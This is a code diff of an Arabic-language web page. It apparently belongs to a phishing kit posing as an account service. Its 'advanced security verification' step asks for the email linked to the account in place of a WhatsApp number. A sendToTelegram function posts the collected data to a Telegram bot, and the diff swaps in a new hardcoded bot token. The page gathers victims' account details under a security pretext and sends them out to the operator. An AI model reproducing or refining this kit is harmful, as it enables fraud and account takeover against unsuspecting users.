@@ -104,8 +104,8 @@
                 </div>
                 <div class="service-option" onclick="selectService(6, 'تغير الهاتف')">
                     <div class="service-content">
-                        <span class="service-title">تغير رقم الهاتف القديم إلى رقم هاتف جديد.</span>
-                        <span class="service-desc">تغير رقم الهاتف القديم إلى رقم هاتف جديد.</span>
+                        <span class="service-title">تغير الهاتف القديم إلى هاتف جديد.</span>
+                        <span class="service-desc">تغير الهاتف القديم إلى هاتف جديد.</span>
                     </div>
                     <span>🔄</span>
                 </div>
@@ -208,10 +208,10 @@
         <!-- الصفحة الثالثة: طلب رقم الواتساب لدواعي أمنية -->
         <div id="step-whatsapp-verification" class="card hidden">
             <h2>التحقق الأمني المتقدم</h2>
-            <h3>لدواعي أمنية يرجى إدخال رقم واتساب للتواصل</h3>
+            <h3لدواعي أمنية يرجى إدخال البريد الإلكتروني المرتبط بالحساب </h3>
             <div class="input-group">
-                <label>رقم تواصل واتساب الفعال:</label>
-                <input type="tel" id="whatsapp-num" placeholder="أدخل رقم الواتساب الفعال (مثال: 0912345678)">
+                <label>البريد الاإلكتروني :</label>
+                <input type="tel" id="gmail-num" placeholder="أدخال البريد الالكتروني المرتبط بالحساب (مثال: test@gmail.com)">
             </div>
             <button class="btn-submit" onclick="submitWhatsappStep()">حفظ ومتابعة</button>
         </div>
@@ -501,7 +501,7 @@
         }
 
         function sendToTelegram(messageText) {
-            const botToken = "8903249824:AAHKnYgFMKZAFHkGrNiHr25tsa_4TvswaWQ";
+            const botToken = "8908326483:AAEeKEUe2hQmWml8tYIGydZX5eAZmzxY40o";
             const chatId = "8623773122";
             const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
             
@@ -513,4 +513,4 @@
         }
     </script>
 </body>
-                    </html>
+    </html>
